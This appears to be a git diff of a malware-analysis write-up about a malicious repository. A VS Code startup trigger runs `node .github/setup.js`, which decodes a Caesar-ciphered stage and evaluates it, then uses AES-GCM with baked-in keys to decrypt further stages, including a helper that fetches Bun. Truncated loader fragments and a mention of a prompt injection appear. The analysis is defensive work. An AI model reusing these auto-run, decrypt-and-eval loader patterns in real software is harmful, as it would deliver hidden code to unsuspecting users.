@@ -79,7 +79,7 @@ This certainly seems like a [prompt injection](https://en.wikipedia.org/wiki/Pro
 This seems to be a deterministic trigger that runs when [vscode](https://code.visualstudio.com) starts, and does the same thing as the others.  
 At this point, we know `node .github/setup.js` is the intended payload.
 
-## Initial payload
+## Stage 0
 The first payload is quite a big JavaScript file that would run under [node](https://nodejs.org). Since it's quite big, I have simply uploaded here under [setup.js.txt]. In essence, it looks like this:
 ```js
 try {
@@ -101,8 +101,8 @@ The wrapper code is simple - it is a [Caesar cipher](https://en.wikipedia.org/wi
 The entire thing is joined and evaluated using `eval`.  
 Decoding that reveals the next part.
 
-## First stage
-Second stage looks like this:
+## Stage 1
+This stage looks like this:
 ```js
 (async()=>{try{
 const _c=await import("node:crypto");
@@ -127,7 +127,7 @@ const _cp=await import("node:child_process")
 }catch(e){console.log("wrapper:",e.message||e)}})()
 ```
 
-As can be seen, we have a payload that uses [AES-GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode), which is a *symmetric cipher*, to decrypt the next payload, which consists of:
+As can be seen, we have a payload that uses [AES-GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode), which is a *symmetric cipher*, to decrypt the next payload. Keys and IVs are baked into this file. The payload consists of:
 1. `_b`: a "bootstrap".
 2. `_p`: the real payload. I truncated the payload for brevity, but have uploaded the entire stage to [stage1.js.txt].
 
@@ -161,3 +161,7 @@ globalThis.getBunPath=function(){
 ```
 
 Note how it attempts to find or download Bun.
+
+## Stage 2
+I have uploaded it to [stage2.js.txt].  
+This part consists of a highly obfuscated (maybe with [obfuscator.io]) payload.  
